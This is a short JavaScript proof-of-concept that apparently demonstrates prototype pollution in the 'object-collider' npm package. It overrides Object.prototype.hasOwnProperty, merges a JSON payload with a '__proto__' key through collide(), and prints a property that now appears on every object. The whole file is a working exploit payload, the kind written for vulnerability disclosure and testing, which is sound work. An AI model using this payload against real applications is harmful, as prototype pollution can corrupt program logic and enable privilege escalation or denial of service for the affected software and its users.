Object.prototype.hasOwnProperty = () => true;
var {collide} = require('object-collider');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
obj = {};
console.log({}.polluted);
collide(obj, payload);
console.log({}.polluted);